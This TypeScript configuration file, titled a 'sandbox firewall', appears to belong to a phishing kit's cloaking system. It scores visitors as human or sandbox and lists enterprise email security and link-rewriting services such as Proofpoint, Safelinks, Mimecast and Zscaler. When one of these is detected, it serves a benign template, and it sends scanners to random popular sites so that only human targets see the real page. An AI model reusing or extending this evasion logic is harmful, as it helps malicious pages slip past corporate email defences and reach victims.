/**
 * MASTER SANDBOX FIREWALL - Configuration
 * Phase 5.7: Centralized configuration for firewall rules
 */

export interface FirewallConfig {
  // Scoring thresholds
  humanScoreThreshold: number
  suspiciousThreshold: number
  sandboxThresholdHigh: number
  sandboxThresholdLow: number
  
  // Behavior flags
  allowUnverifiedHumans: boolean
  alwaysBenignOnRewrite: boolean
  
  // Safe redirect domains
  safeRedirectDomains: string[]
  
  // Enterprise URL rewriter domains
  enterpriseRewriters: string[]
}

export const FIREWALL_CONFIG: FirewallConfig = {
  // Human score must be >= 70 to be considered verified human
  humanScoreThreshold: 70,
  
  // Score 40-69 = suspicious, requires CAPTCHA
  suspiciousThreshold: 40,
  
  // Sandbox confidence >= 80 = high confidence sandbox
  sandboxThresholdHigh: 80,
  
  // Sandbox confidence >= 50 = low confidence sandbox
  sandboxThresholdLow: 50,
  
  // Allow humans without verification (default: false for security)
  allowUnverifiedHumans: false,
  
  // Always serve benign template if enterprise rewriter detected
  alwaysBenignOnRewrite: true,
  
  // Safe redirect domains for bots/scanners
  safeRedirectDomains: [
    'https://en.wikipedia.org/wiki/Main_Page',
    'https://www.amazon.com',
    'https://www.ebay.com',
    'https://www.microsoft.com',
    'https://www.google.com',
    'https://www.apple.com',
    'https://www.github.com',
    'https://www.reddit.com',
    'https://www.youtube.com',
  ],
  
  // Enterprise URL rewriting services
  enterpriseRewriters: [
    'urldefense.proofpoint.com',
    'nam12.safelinks.protection.outlook.com',
    'nam13.safelinks.protection.outlook.com',
    'nam14.safelinks.protection.outlook.com',
    'nam15.safelinks.protection.outlook.com',
    'safelinks.protection.outlook.com',
    'protection.outlook.com',
    'linkprotect.cudasvc.com',
    'mimecast.com',
    'mimecast-offshore.com',
    'mimecast.co.za',
    'barracuda.com',
    'barracudanetworks.com',
    'barracudacentral.org',
    'forcepoint.com',
    'websense.com',
    'symantec.com',
    'messagelabs.com',
    'trendmicro.com',
    'sophos.com',
    'fireeye.com',
    'zscaler.com',
    'fortinet.com',
    'checkpoint.com',
  ],
}

/**
 * Get random safe redirect URL
 */
export function getRandomSafeRedirect(): string {
  const domains = FIREWALL_CONFIG.safeRedirectDomains
  const randomDomain = domains[Math.floor(Math.random() * domains.length)]
  
  // Add random parameters to prevent bot tracking
  const params = new URLSearchParams()
  params.set('ref', Math.random().toString(36).substring(2, 15))
  params.set('t', Date.now().toString())
  params.set('id', Math.random().toString(36).substring(2, 10))
  
  const separator = randomDomain.includes('?') ? '&' : '?'
  return `${randomDomain}${separator}${params.toString()}`
}

/**
 * Check if referer is from enterprise rewriter
 */
export function isEnterpriseRewriter(referer: string | null): boolean {
  if (!referer) return false
  
  const refererLower = referer.toLowerCase()
  return FIREWALL_CONFIG.enterpriseRewriters.some(domain => 
    refererLower.includes(domain.toLowerCase())
  )
}





